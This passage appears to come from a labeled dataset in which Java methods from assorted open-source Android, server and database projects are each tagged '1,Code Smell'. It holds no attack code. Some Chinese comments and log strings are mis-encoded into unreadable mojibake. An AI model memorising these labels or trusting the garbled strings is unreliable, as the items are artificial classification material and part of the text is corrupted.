        ssrcFactory.releaseSsrc(sendRtpItem.getMediaServerId(),sendRtpItem.getSsrc());
        boolean stopResult=mediaServerService.initStopSendRtp(mediaServerItem,sendRtpItem.getApp(),sendRtpItem.getStream(),sendRtpItem.getSsrc());
        if (stopResult) {
          ParentPlatform platform=platformService.queryPlatformByServerGBId(sendRtpItem.getPlatformId());
          if (platform != null) {
            try {
              commanderForPlatform.streamByeCmd(platform,sendRtpItem.getCallId());
            }
 catch (            InvalidArgumentException|ParseException|SipException e) {
              logger.error(""[鍛戒护鍙戦佸け璐 鍥芥爣绾ц仈 鍙戦丅YE: {}"",e.getMessage());
            }
          }
        }
      }
    }
  }
}",1,Code Smell
"@Override public boolean onInterceptHoverEvent(MotionEvent ev){
  if (mActivity == null || mActivity.getWorkspace() == null) {
    return false;
  }
  AbstractFloatingView topView=AbstractFloatingView.getTopOpenView(mActivity);
  if (!(topView instanceof Folder)) {
    return false;
  }
 else {
    AccessibilityManager accessibilityManager=(AccessibilityManager)getContext().getSystemService(Context.ACCESSIBILITY_SERVICE);
    if (accessibilityManager.isTouchExplorationEnabled()) {
      Folder currentFolder=(Folder)topView;
      final int action=ev.getAction();
      boolean isOverFolderOrSearchBar;
switch (action) {
case MotionEvent.ACTION_HOVER_ENTER:
        isOverFolderOrSearchBar=isEventOverView(topView,ev) || isEventOverAccessibleDropTargetBar(ev);
      if (!isOverFolderOrSearchBar) {
        sendTapOutsideFolderAccessibilityEvent(currentFolder.isEditingName());
        mHoverPointClosesFolder=true;
        return true;
      }
    mHoverPointClosesFolder=false;
  break;
case MotionEvent.ACTION_HOVER_MOVE:
isOverFolderOrSearchBar=isEventOverView(topView,ev) || isEventOverAccessibleDropTargetBar(ev);
if (!isOverFolderOrSearchBar && !mHoverPointClosesFolder) {
sendTapOutsideFolderAccessibilityEvent(currentFolder.isEditingName());
mHoverPointClosesFolder=true;
return true;
}
 else if (!isOverFolderOrSearchBar) {
return true;
}
mHoverPointClosesFolder=false;
}
}
}
return false;
}
",1,Code Smell
"@Override @RequestMapping(value=""getCarParkUseLogList"",method=RequestMethod.GET) public ResponseResult getCarParkUseLogList(CfCarParkUseLogQuery cfCarParkUseLogQuery) throws Exception {
  UserBasicInfo userBasicInfo=AuthenticationInterceptor.parseJwt(HttpHearderUtils.getAuthorization(request));
  if (StringUtils.isNotEmpty(cfCarParkUseLogQuery.getNumberPlate()) && cfCarParkUseLogQuery.getNumberPlate().length() < 5) {
    cfCarParkUseLogQuery.setNumberPlate(null);
  }
  if (StringUtils.isEmpty(cfCarParkUseLogQuery.getNumberPlate())) {
    CfCarParkCarQuery cfCarParkCarQuery=new CfCarParkCarQuery();
    cfCarParkCarQuery.setUid(userBasicInfo.getId());
    List<CfCarParkCar> cfCarParkCars=cfCarParkCarService.getMyCarsByCondition(cfCarParkCarQuery);
    if (cfCarParkCars != null && cfCarParkCars.size() > 0) {
      List<String> numberPlates=new ArrayList<String>();
      for (      CfCarParkCar cfCarParkCar : cfCarParkCars) {
        numberPlates.add(cfCarParkCar.getNumberPlate());
      }
      cfCarParkUseLogQuery.setNumberPlates(numberPlates);
    }
 else {
      return new ResponseResult(CommonCode.NO_MORE_DATAS);
    }
  }
  cfCarParkUseLogQuery.setOrderBy(""cpul.create_time desc"");
  List<CfCarParkUseLog> cfCarParkUseLogs=cfCarParkUseLogService.selectByQuery(cfCarParkUseLogQuery);
  if (cfCarParkUseLogs != null && cfCarParkUseLogs.size() > 0) {
    for (    CfCarParkUseLog cfCarParkUseLog : cfCarParkUseLogs) {
      if (cfCarParkUseLog.getCfCarPark() != null) {
        cfCarParkUseLog.getCfCarPark().setName(StringTools.vaguePartString(cfCarParkUseLog.getCfCarPark().getName(),3,2));
        cfCarParkUseLog.getCfCarPark().setPositionX(null);
        cfCarParkUseLog.getCfCarPark().setPositionY(null);
      }
    }
    return new ResponseResult(CommonCode.SUCCESS,cfCarParkUseLogs);
  }
  return new ResponseResult(CommonCode.NO_MORE_DATAS);
}",1,Code Smell
"public boolean onAttachedToWindow(){
  if (attachedToWindow) {
    return false;
  }
  attachedToWindow=true;
  currentOpenedLayerFlags=NotificationCenter.getGlobalInstance().getCurrentHeavyOperationFlags();
  currentOpenedLayerFlags&=~currentLayerNum;
  if (!ignoreNotifications) {
    NotificationCenter.getGlobalInstance().addObserver(this,NotificationCenter.didReplacedPhotoInMemCache);
    NotificationCenter.getGlobalInstance().addObserver(this,NotificationCenter.stopAllHeavyOperations);
    NotificationCenter.getGlobalInstance().addObserver(this,NotificationCenter.startAllHeavyOperations);
  }
  if (setBackupImage()) {
    return true;
  }
  RLottieDrawable lottieDrawable=getLottieAnimation();
  if (lottieDrawable != null) {
    lottieDrawable.addParentView(this);
    lottieDrawable.setAllowVibration(allowLottieVibration);
  }
  if (lottieDrawable != null && allowStartLottieAnimation && (!lottieDrawable.isHeavyDrawable() || currentOpenedLayerFlags == 0)) {
    lottieDrawable.start();
  }
  AnimatedFileDrawable animatedFileDrawable=getAnimation();
  if (animatedFileDrawable != null) {
    animatedFileDrawable.addParent(this);
  }
  if (animatedFileDrawable != null && allowStartAnimation && currentOpenedLayerFlags == 0) {
    animatedFileDrawable.checkRepeat();
    invalidate();
  }
  if (NotificationCenter.getGlobalInstance().isAnimationInProgress()) {
    didReceivedNotification(NotificationCenter.stopAllHeavyOperations,currentAccount,512);
  }
  if (staticThumbDrawable instanceof AttachableDrawable) {
    ((AttachableDrawable)staticThumbDrawable).onAttachedToWindow(this);
  }
  if (decorators != null) {
    for (int i=0; i < decorators.size(); i++) {
      decorators.get(i).onAttachedToWindow(this);
    }
  }
  return false;
}
public void onAttachedToWindow(ImageReceiver imageReceiver){
}",1,Code Smell
"private List<Header> setColumnInfo(List<Header> headers,String tableName,String schemaName,String databaseName){
  try {
    TableQueryParam tableQueryParam=new TableQueryParam();
    tableQueryParam.setTableName(MetaNameUtils.getMetaName(tableName));
    tableQueryParam.setSchemaName(schemaName);
    tableQueryParam.setDatabaseName(databaseName);
    tableQueryParam.setRefresh(true);
    List<TableColumn> columns=tableService.queryColumns(tableQueryParam);
    if (CollectionUtils.isEmpty(columns)) {
      return headers;
    }
    Map<String,TableColumn> columnMap=columns.stream().collect(Collectors.toMap(TableColumn::getName,tableColumn -> tableColumn));
    List<TableIndex> tableIndices=tableService.queryIndexes(tableQueryParam);
    if (!CollectionUtils.isEmpty(tableIndices)) {
      for (      TableIndex tableIndex : tableIndices) {
        if (""PRIMARY"".equalsIgnoreCase(tableIndex.getType())) {
          List<TableIndexColumn> columnList=tableIndex.getColumnList();
          if (!CollectionUtils.isEmpty(columnList)) {
            for (            TableIndexColumn tableIndexColumn : columnList) {
              TableColumn tableColumn=columnMap.get(tableIndexColumn.getColumnName());
              if (tableColumn != null) {
                tableColumn.setPrimaryKey(true);
              }
            }
          }
        }
      }
    }
    for (    Header header : headers) {
      TableColumn tableColumn=columnMap.get(header.getName());
      if (tableColumn != null) {
        header.setPrimaryKey(tableColumn.getPrimaryKey());
        header.setComment(tableColumn.getComment());
        header.setDefaultValue(tableColumn.getDefaultValue());
        header.setNullable(tableColumn.getNullable());
        header.setColumnSize(tableColumn.getColumnSize());
        header.setDecimalDigits(tableColumn.getDecimalDigits());
      }
    }
  }
 catch (  Exception e) {
    log.error(""setColumnInfo error:"",e);
  }
  return headers;
}
",1,Code Smell
"@Override public Object apply(Object input,Schema<Object,?> schema){
  Class clazz;
  Object result=null;
  if (input instanceof Class) {
    clazz=(Class)input;
  }
 else {
    clazz=input.getClass();
    result=input;
  }
  if (clazz.isRecord()) {
    Constructor<?> recordConstructor=CLASS2CONSTRUCTOR.get(clazz);
    if (recordConstructor == null) {
      Class<?>[] componentTypes=Arrays.stream(clazz.getRecordComponents()).map(RecordComponent::getType).toArray(Class<?>[]::new);
      try {
        recordConstructor=clazz.getDeclaredConstructor(componentTypes);
        CLASS2CONSTRUCTOR.put(clazz,recordConstructor);
      }
 catch (      NoSuchMethodException e) {
        throw new RuntimeException(e);
      }
    }
    result=getObject(schema,result,recordConstructor);
  }
 else   if (!hasParameterlessPublicConstructor(clazz)) {
    Constructor<?> primaryConstructor=CLASS2CONSTRUCTOR.get(clazz);
    if (primaryConstructor == null) {
      primaryConstructor=clazz.getDeclaredConstructors()[0];
      CLASS2CONSTRUCTOR.put(clazz,primaryConstructor);
    }
    result=getObject(schema,result,primaryConstructor);
  }
 else {
    if (result == null) {
      try {
        Constructor<?> primaryConstructor=CLASS2CONSTRUCTOR.get(clazz);
        if (primaryConstructor == null) {
          primaryConstructor=clazz.getDeclaredConstructors()[0];
          CLASS2CONSTRUCTOR.put(clazz,primaryConstructor);
        }
        result=primaryConstructor.newInstance();
      }
 catch (      InstantiationException|IllegalAccessException|InvocationTargetException e) {
        throw new RuntimeException(e);
      }
    }
    Consumer<Object> consumer=SCHEMA2CONSUMER.get(schema);
    if (consumer == null) {
      final Field<Object,?>[] fields=schema.getFields();
      final Map<String,java.lang.reflect.Field> name2ClassField=Stream.of(clazz.getDeclaredFields()).collect(Collectors.toMap(java.lang.reflect.Field::getName,Function.identity()));
      final java.lang.reflect.Field[] rFields=new java.lang.reflect.Field[fields.length];
      for (int i=0; i < fields.length; i++) {
        rFields[i]=name2ClassField.get(fields[i].getName());
        rFields[i].setAccessible(true);
      }
      consumer=classObject -> {
        try {
          for (int i=0; i < fields.length; i++) {
            rFields[i].set(classObject,fields[i].transform(classObject));
          }
        }
 catch (        IllegalAccessException e) {
          throw new RuntimeException(e);
        }
      }
;
      SCHEMA2CONSUMER.put(schema,consumer);
    }
    consumer.accept(result);
  }
  return result;
}",1,Code Smell
"public void setAudioOutput(int which){
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""setAudioOutput "" + which);
  }
  AudioManager am=(AudioManager)getSystemService(AUDIO_SERVICE);
  VoipAudioManager vam=VoipAudioManager.get();
  if (USE_CONNECTION_SERVICE && systemCallConnection != null) {
switch (which) {
case 2:
      systemCallConnection.setAudioRoute(CallAudioState.ROUTE_BLUETOOTH);
    break;
case 1:
  systemCallConnection.setAudioRoute(CallAudioState.ROUTE_WIRED_OR_EARPIECE);
break;
case 0:
systemCallConnection.setAudioRoute(CallAudioState.ROUTE_SPEAKER);
break;
}
}
 else if (audioConfigured && !USE_CONNECTION_SERVICE) {
switch (which) {
case 2:
if (!bluetoothScoActive) {
needSwitchToBluetoothAfterScoActivates=true;
try {
am.startBluetoothSco();
}
 catch (Throwable e) {
FileLog.e(e);
}
}
 else {
am.setBluetoothScoOn(true);
vam.setSpeakerphoneOn(false);
}
audioRouteToSet=AUDIO_ROUTE_BLUETOOTH;
break;
case 1:
needSwitchToBluetoothAfterScoActivates=false;
if (bluetoothScoActive || bluetoothScoConnecting) {
am.stopBluetoothSco();
bluetoothScoActive=false;
bluetoothScoConnecting=false;
}
vam.setSpeakerphoneOn(false);
am.setBluetoothScoOn(false);
audioRouteToSet=AUDIO_ROUTE_EARPIECE;
break;
case 0:
needSwitchToBluetoothAfterScoActivates=false;
if (bluetoothScoActive || bluetoothScoConnecting) {
am.stopBluetoothSco();
bluetoothScoActive=false;
bluetoothScoConnecting=false;
}
am.setBluetoothScoOn(false);
vam.setSpeakerphoneOn(true);
audioRouteToSet=AUDIO_ROUTE_SPEAKER;
break;
}
updateOutputGainControlState();
}
 else {
switch (which) {
case 2:
audioRouteToSet=AUDIO_ROUTE_BLUETOOTH;
speakerphoneStateToSet=false;
break;
case 1:
audioRouteToSet=AUDIO_ROUTE_EARPIECE;
speakerphoneStateToSet=false;
break;
case 0:
audioRouteToSet=AUDIO_ROUTE_SPEAKER;
speakerphoneStateToSet=true;
break;
}
}
for (StateListener l : stateListeners) {
l.onAudioSettingsChanged();
}
}",1,Code Smell
"@SuppressLint(""NotifyDataSetChanged"") private void setVisibleReactionsList(List<ReactionsLayoutInBubble.VisibleReaction> visibleReactionsList){
  this.visibleReactionsList.clear();
  if (showCustomEmojiReaction()) {
    int i=0;
    int n=(AndroidUtilities.displaySize.x - AndroidUtilities.dp(36)) / AndroidUtilities.dp(34);
    if (n > 7) {
      n=7;
    }
    if (n < 1) {
      n=1;
    }
    for (; i < Math.min(visibleReactionsList.size(),n); i++) {
      this.visibleReactionsList.add(visibleReactionsList.get(i));
    }
    if (i < visibleReactionsList.size()) {
      nextRecentReaction.setReaction(visibleReactionsList.get(i),-1);
    }
  }
 else {
    this.visibleReactionsList.addAll(visibleReactionsList);
  }
  allReactionsIsDefault=true;
  for (int i=0; i < this.visibleReactionsList.size(); i++) {
    if (this.visibleReactionsList.get(i).documentId != 0) {
      allReactionsIsDefault=false;
    }
  }
  allReactionsList.clear();
  allReactionsList.addAll(visibleReactionsList);
  int size=getLayoutParams().height - getPaddingTop() - getPaddingBottom();
  if (size * visibleReactionsList.size() < AndroidUtilities.dp(200)) {
    getLayoutParams().width=ViewGroup.LayoutParams.WRAP_CONTENT;
  }
  listAdapter.notifyDataSetChanged();
}",1,Code Smell
"/** 
 * @param propertyString propertyString
 * @return Extract keys from placeholder, e.g.<ul> <li>${some.key} =&gt; ""some.key""</li> <li>${some.key:${some.other.key:100}} =&gt; ""some.key"", ""some.other.key""</li> <li>${${some.key}} =&gt; ""some.key""</li> <li>${${some.key:other.key}} =&gt; ""some.key""</li> <li>${${some.key}:${another.key}} =&gt; ""some.key"", ""another.key""</li> <li>#{new java.text.SimpleDateFormat('${some.key}').parse('${another.key}')} =&gt; ""some.key"", ""another.key""</li> </ul>
 */
public Set<String> extractPlaceholderKeys(String propertyString){
  Set<String> placeholderKeys=Sets.newHashSet();
  if (!isPlaceholder(propertyString)) {
    return placeholderKeys;
  }
  Stack<String> stack=new Stack<>();
  stack.push(propertyString);
  while (!stack.isEmpty()) {
    String strVal=stack.pop();
    int startIndex=strVal.indexOf(PLACEHOLDER_PREFIX);
    if (startIndex == -1) {
      placeholderKeys.add(strVal);
      continue;
    }
    int endIndex=findPlaceholderEndIndex(strVal,startIndex);
    if (endIndex == -1) {
      continue;
    }
    String placeholderCandidate=strVal.substring(startIndex + PLACEHOLDER_PREFIX.length(),endIndex);
    if (placeholderCandidate.startsWith(PLACEHOLDER_PREFIX)) {
      stack.push(placeholderCandidate);
    }
 else {
      int separatorIndex=placeholderCandidate.indexOf(VALUE_SEPARATOR);
      if (separatorIndex == -1) {
        stack.push(placeholderCandidate);
      }
 else {
        stack.push(placeholderCandidate.substring(0,separatorIndex));
        String defaultValuePart=normalizeToPlaceholder(placeholderCandidate.substring(separatorIndex + VALUE_SEPARATOR.length()));
        if (!Strings.isNullOrEmpty(defaultValuePart)) {
          stack.push(defaultValuePart);
        }
      }
    }
    if (endIndex + PLACEHOLDER_SUFFIX.length() < strVal.length() - 1) {
      String remainingPart=normalizeToPlaceholder(strVal.substring(endIndex + PLACEHOLDER_SUFFIX.length()));
      if (!Strings.isNullOrEmpty(remainingPart)) {
        stack.push(remainingPart);
      }
    }
  }
  return placeholderKeys;
}",1,Code Smell
"public boolean resizeIfNeeded(int newDepthBufferVersion,int newDepthTextureId,int newWidth,int newHeight,DepthBufferFormat newDepthFormat,PackDirectives packDirectives){
  boolean recreateDepth=false;
  if (cachedDepthBufferVersion != newDepthBufferVersion) {
    recreateDepth=true;
    currentDepthTexture=newDepthTextureId;
    cachedDepthBufferVersion=newDepthBufferVersion;
  }
  boolean sizeChanged=newWidth != cachedWidth || newHeight != cachedHeight;
  boolean depthFormatChanged=newDepthFormat != currentDepthFormat;
  if (depthFormatChanged) {
    currentDepthFormat=newDepthFormat;
    copyStrategy=DepthCopyStrategy.fastest(currentDepthFormat.isCombinedStencil());
  }
  if (recreateDepth) {
    for (    GlFramebuffer framebuffer : ownedFramebuffers) {
      if (framebuffer == noHandDestFb || framebuffer == noTranslucentsDestFb) {
        continue;
      }
      if (framebuffer.hasDepthAttachment()) {
        framebuffer.addDepthAttachment(newDepthTextureId);
      }
    }
  }
  if (depthFormatChanged || sizeChanged) {
    noTranslucents.resize(newWidth,newHeight,newDepthFormat);
    noHand.resize(newWidth,newHeight,newDepthFormat);
    this.translucentDepthDirty=true;
    this.handDepthDirty=true;
  }
  if (sizeChanged) {
    cachedWidth=newWidth;
    cachedHeight=newHeight;
    for (int i=0; i < targets.length; i++) {
      if (targets[i] != null) {
        targets[i].resize(packDirectives.getTextureScaleOverride(i,newWidth,newHeight));
      }
    }
    fullClearRequired=true;
  }
  return sizeChanged;
}",1,Code Smell
"public static SQLQueryAdapter create(PostgresGlobalState globalState){
  PostgresTable table=globalState.getSchema().getRandomTable();
  StringBuilder sb=new StringBuilder(""VACUUM "");
  if (Randomly.getBoolean()) {
    sb.append(""("");
    for (int i=0; i < Randomly.smallNumber() + 1; i++) {
      ArrayList<String> opts=new ArrayList<>(Arrays.asList(""FULL"",""FREEZE"",""ANALYZE"",""VERBOSE"",""DISABLE_PAGE_SKIPPING"",""SKIP_LOCKED"",""INDEX_CLEANUP"",""TRUNCATE""));
      String option=Randomly.fromList(opts);
      if (i != 0) {
        sb.append("", "");
      }
      sb.append(option);
      if (Randomly.getBoolean()) {
        sb.append("" "");
        sb.append(Randomly.fromOptions(1,0));
      }
    }
    sb.append("")"");
    if (Randomly.getBoolean()) {
      addTableAndColumns(table,sb);
    }
  }
 else {
    String firstOption=Randomly.fromOptions(""FULL"",""FREEZE"",""VERBOSE"");
    sb.append(firstOption);
    if (Randomly.getBoolean()) {
      sb.append("" ANALYZE"");
      addTableAndColumns(table,sb);
    }
 else {
      if (Randomly.getBoolean()) {
        sb.append("" "");
        sb.append(table.getName());
      }
    }
  }
  ExpectedErrors errors=new ExpectedErrors();
  errors.add(""VACUUM cannot run inside a transaction block"");
  errors.add(""deadlock"");
  errors.add(""ERROR: ANALYZE option must be specified when a column list is provided"");
  errors.add(""VACUUM option DISABLE_PAGE_SKIPPING cannot be used with FULL"");
  return new SQLQueryAdapter(sb.toString(),errors);
}",1,Code Smell
"/** 
 * 瑙ｆ瀽 {@code [}鏍囪涔嬪悗鐨勪竴涓暟缁勩��
 * @param p
 * @return
 * @throws Throwable
 */
protected Object[] parseNextArray(JsonParser p) throws Throwable {
  List<Object> list=new ArrayList<>();
  while (p.hasNext()) {
    Event e=p.next();
    if (Event.KEY_NAME.equals(e)) {
      throw new IllegalJsonDataFormatException(p.getLocation(),false,Event.KEY_NAME);
    }
 else     if (Event.VALUE_FALSE.equals(e)) {
      list.add(false);
    }
 else     if (Event.VALUE_NULL.equals(e)) {
      list.add(null);
    }
 else     if (Event.VALUE_NUMBER.equals(e)) {
      list.add(p.getBigDecimal());
    }
 else     if (Event.VALUE_STRING.equals(e)) {
      list.add(p.getString());
    }
 else     if (Event.VALUE_TRUE.equals(e)) {
      list.add(true);
    }
 else     if (Event.START_OBJECT.equals(e)) {
      Object subMap=parseNextObject(p);
      list.add(subMap);
    }
 else     if (Event.END_OBJECT.equals(e)) {
      throw new IllegalJsonDataFormatException(p.getLocation(),false,Event.END_OBJECT);
    }
 else     if (Event.START_ARRAY.equals(e)) {
      Object[] subArray=parseNextArray(p);
      list.add(subArray);
    }
 else     if (Event.END_ARRAY.equals(e)) {
      break;
    }
  }
  return list.toArray();
}
",1,Code Smell
"/** 
 * Interrupts script execution.
 */
private void interrupted(Context cx,final StackFrame frame,Throwable scriptException){
  ContextData contextData=frame.contextData();
  boolean eventThreadFlag=callback.isGuiEventThread();
  contextData.eventThreadFlag=eventThreadFlag;
  boolean recursiveEventThreadCall=false;
  interruptedCheck: synchronized (eventThreadMonitor) {
    if (eventThreadFlag) {
      if (interruptedContextData != null) {
        recursiveEventThreadCall=true;
        break interruptedCheck;
      }
    }
 else {
      while (interruptedContextData != null) {
        try {
          eventThreadMonitor.wait();
        }
 catch (        InterruptedException exc) {
          return;
        }
      }
    }
    interruptedContextData=contextData;
  }
  if (recursiveEventThreadCall) {
    if (false) {
      while (this.returnValue == -1) {
        try {
          callback.dispatchNextGuiEvent();
        }
 catch (        InterruptedException exc) {
        }
      }
    }
    return;
  }
  if (interruptedContextData == null)   Kit.codeBug();
  try {
    do {
      int frameCount=contextData.frameCount();
      this.frameIndex=frameCount - 1;
      final String threadTitle=Thread.currentThread().toString();
      final String alertMessage;
      if (scriptException == null) {
        alertMessage=null;
      }
 else {
        alertMessage=scriptException.toString();
      }
      int returnValue=-1;
      if (!eventThreadFlag) {
synchronized (monitor) {
          if (insideInterruptLoop)           Kit.codeBug();
          this.insideInterruptLoop=true;
          this.evalRequest=null;
          this.returnValue=-1;
          callback.enterInterrupt(frame,threadTitle,alertMessage);
          try {
            for (; ; ) {
              try {
                monitor.wait();
              }
 catch (              InterruptedException exc) {
                Thread.currentThread().interrupt();
                break;
              }
              if (evalRequest != null) {
                this.evalResult=null;
                try {
                  evalResult=do_eval(cx,evalFrame,evalRequest);
                }
  finally {
                  evalRequest=null;
                  evalFrame=null;
                  monitor.notify();
                }
                continue;
              }
              if (this.returnValue != -1) {
                returnValue=this.returnValue;
                break;
              }
            }
          }
  finally {
            insideInterruptLoop=false;
          }
        }
      }
 else {
        this.returnValue=-1;
        callback.enterInterrupt(frame,threadTitle,alertMessage);
        while (this.returnValue == -1) {
          try {
            callback.dispatchNextGuiEvent();
          }
 catch (          InterruptedException exc) {
          }
        }
        returnValue=this.returnValue;
      }
switch (returnValue) {
case STEP_OVER:
        contextData.breakNextLine=true;
      contextData.stopAtFrameDepth=contextData.frameCount();
    break;
case STEP_INTO:
  contextData.breakNextLine=true;
contextData.stopAtFrameDepth=-1;
break;
case STEP_OUT:
if (contextData.frameCount() > 1) {
contextData.breakNextLine=true;
contextData.stopAtFrameDepth=contextData.frameCount() - 1;
}
break;
}
}
 while (false);
}
  finally {
synchronized (eventThreadMonitor) {
interruptedContextData=null;
eventThreadMonitor.notifyAll();
}
}
}",1,Code Smell
"private void showSeekBar(View workspace){
  if (!""Workspace"".equals(workspace.getClass().getSimpleName()))   return;
  boolean isInEditingMode=(boolean)XposedHelpers.callMethod(workspace,""isInNormalEditingMode"");
  View mScreenSeekBar=(View)XposedHelpers.getObjectField(workspace,""mScreenSeekBar"");
  if (mScreenSeekBar == null) {
    XposedLogUtils.logI(""showSeekBar"",""HideSeekPointsHook Cannot find seekbar"");
    return;
  }
  Context mContext=workspace.getContext();
  Handler mHandler=(Handler)XposedHelpers.getAdditionalInstanceField(workspace,""mHandlerEx"");
  if (mHandler == null) {
    mHandler=new Handler(mContext.getMainLooper()){
      @Override public void handleMessage(      Message msg){
        View seekBar=(View)msg.obj;
        if (seekBar != null)         seekBar.animate().alpha(0.0f).setDuration(600).withEndAction(new Runnable(){
          @Override public void run(){
            seekBar.setVisibility(View.GONE);
          }
        }
);
      }
    }
;
    XposedHelpers.setAdditionalInstanceField(workspace,""mHandlerEx"",mHandler);
  }
  if (mHandler == null) {
    XposedLogUtils.logI(""showSeekBar"",""HideSeekPointsHook Cannot create handler"");
    return;
  }
  if (mHandler.hasMessages(666))   mHandler.removeMessages(666);
  mScreenSeekBar.animate().cancel();
  if (!isInEditingMode && XposedInit.mPrefsMap.getStringAsInt(""home_other_seek_points"",0) == 2) {
    mScreenSeekBar.setAlpha(0.0f);
    mScreenSeekBar.setVisibility(View.GONE);
    return;
  }
  mScreenSeekBar.setVisibility(View.VISIBLE);
  mScreenSeekBar.animate().alpha(1.0f).setDuration(300);
  if (!isInEditingMode) {
    Message msg=Message.obtain(mHandler,666);
    msg.obj=mScreenSeekBar;
    mHandler.sendMessageDelayed(msg,1500);
  }
}",1,Code Smell
"private static void popupTask(){
  try {
    JSONObject resData=new JSONObject(AntForestRpcCall.popupTask());
    if (""SUCCESS"".equals(resData.getString(""resultCode""))) {
      JSONArray forestSignVOList=resData.optJSONArray(""forestSignVOList"");
      if (forestSignVOList != null) {
        for (int i=0; i < forestSignVOList.length(); i++) {
          JSONObject forestSignVO=forestSignVOList.getJSONObject(i);
          String signId=forestSignVO.getString(""signId"");
          String currentSignKey=forestSignVO.getString(""currentSignKey"");
          JSONArray signRecords=forestSignVO.getJSONArray(""signRecords"");
          for (int j=0; j < signRecords.length(); j++) {
            JSONObject signRecord=signRecords.getJSONObject(j);
            String signKey=signRecord.getString(""signKey"");
            if (signKey.equals(currentSignKey)) {
              if (!signRecord.getBoolean(""signed"")) {
                int awardCount=signRecord.getInt(""awardCount"");
                JSONObject resData2=new JSONObject(AntForestRpcCall.antiepSign(signId,FriendIdMap.getCurrentUid()));
                if (""100000000"".equals(resData2.getString(""code""))) {
                  collectedEnergy+=awardCount;
                  Log.forest(""杩囨湡鑳介噺馃拪["" + awardCount + ""g]"");
                  onForestEnd();
                }
              }
              break;
            }
          }
        }
      }
    }
 else {
      Log.recordLog(resData.getString(""resultDesc""),resData.toString());
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""popupTask err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * @hidden
 */
public KSet div(KSet rhs){
  if (!isTop() && !rhs.isTop()) {
    assert this.bits == rhs.bits;
  }
  long taintRes=getBinaryTaintResult(rhs);
  if (isTop() || rhs.isTop()) {
    return getTop(taintRes);
  }
  KSet res=new KSet(bits,taintRes);
  for (  AbsVal op1 : kSet) {
    for (    AbsVal op2 : rhs.kSet) {
      if (op2.isZero()) {
        continue;
      }
      RegionBase region=getRegionDivRem(op1,op2);
      if (region != null) {
        if (res.kSet.size() == GlobalState.config.getK()) {
          return getTop(taintRes);
        }
        if (bits <= 64) {
          assert (op1.bigVal == null && op2.bigVal == null);
          res.kSet=res.kSet.insert(new AbsVal(region,Long.divideUnsigned(op1.value,op2.value) & getMask(bits)));
        }
 else {
          BigInteger bigOp1=op1.toBigInteger(bits,false);
          BigInteger bigOp2=op2.toBigInteger(bits,false);
          BigInteger tmp=bigOp1.divide(bigOp2).and(getBigMask(bits));
          res.kSet=res.kSet.insert(new AbsVal(region,tmp));
        }
      }
    }
  }
  return res;
}",1,Code Smell
"private void drawCenterImageInternal(Canvas canvas,float currentMirror,float alpha){
  boolean mirror=false;
  if (!imagesArrLocals.isEmpty()) {
    if (currentEditMode == EDIT_MODE_CROP || sendPhotoType == SELECT_TYPE_AVATAR) {
      mirror=cropTransform.isMirrored();
    }
 else {
      mirror=editState.cropState != null && editState.cropState.mirrored;
    }
  }
  boolean restore=false;
  if (mirror) {
    canvas.save();
    canvas.scale(-1,1);
    restore=true;
  }
  if (currentMirror > 0) {
    if (!restore) {
      canvas.save();
      restore=true;
    }
    canvas.scale(1 - currentMirror * 2,1f);
    canvas.skew(0,4 * currentMirror * (1f - currentMirror)* .25f);
  }
  if (photoViewerWebView == null || !photoViewerWebView.isLoaded()) {
    if (!centerImageTransformLocked)     centerImageTransform.preTranslate(centerImage.getImageX(),centerImage.getImageY());
    stickerMakerView.drawOutline(canvas,false,containerView,switchingToMode != -1);
    centerImage.setAlpha(alpha);
    centerImage.draw(canvas);
    stickerMakerView.drawOutline(canvas,true,containerView,switchingToMode != -1);
    stickerMakerView.drawSegmentBorderPath(canvas,centerImage,centerImageTransform,containerView);
    centerImageTransformLocked=true;
  }
  if (restore) {
    canvas.restore();
  }
}",1,Code Smell
"@Override public void run(){
  pausedPosition=0;
  mReady=true;
  if (mCallback != null) {
    mCallback.prepared();
  }
}
@Override public void run(){
  long lastTime=SystemClock.uptimeMillis();
  long dTime=0;
  while (!isQuited() && !quitFlag) {
    long startMS=SystemClock.uptimeMillis();
    dTime=SystemClock.uptimeMillis() - lastTime;
    long diffTime=mFrameUpdateRate - dTime;
    if (diffTime > 1 && !mNonBlockModeEnable) {
      SystemClock.sleep(1);
      continue;
    }
    lastTime=startMS;
    long d=syncTimer(startMS);
    if (d < 0 && !mNonBlockModeEnable) {
      SystemClock.sleep(60 - d);
      continue;
    }
    d=mDanmakuView.drawDanmakus();
    if (d > mCordonTime2) {
      timer.add(d);
      mDrawTimes.clear();
    }
    if (!mDanmakusVisible) {
      waitRendering(INDEFINITE_TIME);
    }
 else     if (mRenderingState.nothingRendered && mIdleSleep) {
      dTime=mRenderingState.endTime - timer.currMillisecond;
      if (dTime > 500) {
        notifyRendering();
        waitRendering(dTime - 10);
      }
    }
  }
}",1,Code Smell
"/** 
 * Download (if necessary) and process a version's metadata, scheduling all downloads that this version needs.
 * @param activity Activity, used for automatic installation of JRE 17 if needed
 * @param verInfo The JMinecraftVersionList.Version from the version list, if available
 * @param versionName The version ID (necessary)
 * @return false if JRE17 installation failed, true otherwise
 * @throws IOException if the download of any of the metadata files fails
 */
private boolean downloadAndProcessMetadata(Activity activity,JMinecraftVersionList.Version verInfo,String versionName) throws IOException, MirrorTamperedException {
  File versionJsonFile;
  if (verInfo != null)   versionJsonFile=downloadGameJson(verInfo);
 else   versionJsonFile=createGameJsonPath(versionName);
  if (versionJsonFile.canRead()) {
    verInfo=Tools.GLOBAL_GSON.fromJson(Tools.read(versionJsonFile),JMinecraftVersionList.Version.class);
  }
 else {
    throw new IOException(""Unable to read Version JSON for version "" + versionName);
  }
  if (activity != null && !JRE17Util.installNewJreIfNeeded(activity,verInfo)) {
    return false;
  }
  JAssets assets=downloadAssetsIndex(verInfo);
  if (assets != null)   scheduleAssetDownloads(assets);
  MinecraftClientInfo minecraftClientInfo=getClientInfo(verInfo);
  if (minecraftClientInfo != null)   scheduleGameJarDownload(minecraftClientInfo,versionName);
  if (verInfo.libraries != null)   scheduleLibraryDownloads(verInfo.libraries);
  if (verInfo.logging != null)   scheduleLoggingAssetDownloadIfNeeded(verInfo.logging);
  if (Tools.isValidString(verInfo.inheritsFrom)) {
    JMinecraftVersionList.Version inheritedVersion=AsyncMinecraftDownloader.getListedVersion(verInfo.inheritsFrom);
    return downloadAndProcessMetadata(activity,inheritedVersion,verInfo.inheritsFrom);
  }
  return true;
}",1,Code Smell
"/** 
